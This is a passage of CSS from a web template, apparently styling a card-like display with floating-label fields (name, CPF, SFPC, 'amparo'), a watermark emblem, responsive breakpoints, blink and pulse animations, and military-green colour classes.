            margin: 0 auto;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: transparent;
            font-family: 'Roboto', Arial, sans-serif !important;
            padding: 0;
        }
        .cr-field-group {
            position: relative;
            margin-top: 6px;
        }
        .cr-label-float {
            position: absolute;
            top: -1px;
            left: 6px;
            background: white;
            padding: 0 2px;
            font-size: 9px;
            font-weight: 400;
            z-index: 2;
            letter-spacing: 0.01em;
            line-height: 1;
            white-space: nowrap;
        }
        .cr-field {
            border: 1px solid #000;
            border-radius: 0px;
            padding: 4px 6px 4px 8px;
            font-size: 13px;
            font-weight: 400;
            height: 32px;
            display: flex;
            align-items: center;
            position: relative;
            z-index: 1;
            background: transparent;
        }
        .cr-nome .cr-label-float { left: 6px; }
        .cr-cpf .cr-label-float { left: 6px; }
        .cr-sfpc .cr-label-float { left: 6px; }
        .cr-amparo .cr-label-float { left: 6px; }
        .cr-amp {
            font-size: 10px;
            line-height: 1.2;
        }
        .cr-amparo .cr-field {
            height: 48px;
            align-items: flex-start;
            padding-top: 8px;
            padding-bottom: 8px;
        }
        .cr-emblem {
            position: absolute;
            left: 50%;
            top: 50%;
            width: 220px;
            height: 220px;
            opacity: 0.18;
            transform: translate(-50%, -50%);
            z-index: 2;
            pointer-events: none;
            user-select: none;
        }
        .cr-row {
            display: flex;
            gap: 14px;
        }
        .cr-row .cr-field-group {
            flex: 1 1 0;
            margin-top: 0;
        }
        .cr-content * {
            font-family: 'Roboto', Arial, sans-serif !important;
        }
        .cr-content .text-center div,
        .cr-content .cr-label,
        .cr-content .cr-value,
        .cr-content .cr-label-float,
        .cr-content .cr-amp {
            font-family: 'Roboto', Arial, sans-serif !important;
        }
        @media (max-width: 900px) {
            .cr-outer {
                width: 100vw !important;
                height: calc(100vw * 0.714) !important;
                min-width: 0;
                min-height: 0;
                max-width: 100vw;
                max-height: 100vw;
                padding: 0 !important;
            }
            .cr-border-img {
                width: 85vw !important;
                height: 85vw !important;
                min-width: 0 !important;
                min-height: 0 !important;
                max-width: none !important;
                max-height: none !important;
                transform: translate(-50%, -50%) rotate(90deg) !important;
                display: block !important;
            }
            .cr-content {
                width: 88vw !important;
                height: 86vw !important;
                padding: 2vw 2vw !important;
            }
            .cr-emblem {
                width: 35vw !important;
                height: 35vw !important;
                max-width: 200px;
                max-height: 200px;
            }
            .cr-row {
                gap: 1.5vw;
            }
            .cr-label-float {
                font-size: 1.8vw !important;
                top: -0.4vw !important;
                left: 1vw !important;
                padding: 0 0.3vw !important;
            }
            .cr-field {
                font-size: 2.2vw !important;
                height: 5.5vw !important;
                padding: 0.6vw 1.2vw !important;
                min-height: 22px;
            }
            .cr-amparo .cr-field {
                height: 11vw !important;
                min-height: 44px !important;
                padding-top: 1.8vw !important;
                padding-bottom: 1.8vw !important;
            }
            .cr-amp {
                font-size: 1.8vw !important;
            }
        }
        @media (max-width: 600px) {
            .cr-outer {
                width: 100vw !important;
                height: calc(100vw * 0.714) !important;
            }
            .cr-border-img {
                width: 90vw !important;
                height: 90vw !important;
            }
            .cr-content {
                width: 92vw !important;
                height: 90vw !important;
            }
            .cr-emblem {
                width: 40vw !important;
                height: 40vw !important;
                max-width: 160px;
                max-height: 160px;
            }
            .cr-label-float {
                font-size: 2.2vw !important;
            }
            .cr-field {
                font-size: 2.6vw !important;
                height: 6.5vw !important;
            }
            .cr-amparo .cr-field {
                height: 13vw !important;
            }
            .cr-amp {
                font-size: 2.2vw !important;
            }
        }
    @keyframes blink {
        0%, 100% { opacity: 0.8; }
        50% { opacity: 0.4; }
    }
    .blink-animation {
        animation: blink 2s infinite;
    }
    .blink {
        animation: blink 1s infinite;
    }
    .button-3d {
        box-shadow: 0 4px 0 #9a1c1c;
        transform: translateY(-2px);
        transition: all 0.1s;
    }
    .button-3d:active {
        box-shadow: 0 1px 0 #9a1c1c;
        transform: translateY(0);
    }
    .text-shadow {
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
    }
    @keyframes moveLeftRight {
        0%, 100% { transform: translateX(0); }
        50% { transform: translateX(10px); }
    }
    .animate-left-right {
        animation: moveLeftRight 1.5s ease-in-out infinite;
    }
    .button-3d {
        transform: translateY(-2px);
        box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
        transition: all 0.15s ease;
    }
    .button-3d:hover {
        transform: translateY(-1px);
        box-shadow: 0 7px 14px rgba(50, 50, 93, 0.1), 0 3px 6px rgba(0, 0, 0, 0.08);
    }
    .button-3d:active {
        transform: translateY(0);
        box-shadow: 0 4px 6px rgba(50, 50, 93, 0.11), 0 1px 3px rgba(0, 0, 0, 0.08);
    }
    .text-shadow {
        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
    }
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    .animate-pulse {
        animation: pulse 1s cubic-bezier(0.4, 0, 0.6, 1) infinite;
    }
    .border-military-green {
        border-color: #126736;
    }
    .text-military-green {
        color: #126736;
    }
    .text-military-dark {
        color: #0c4a29;
    }
</style>

{% endblock %}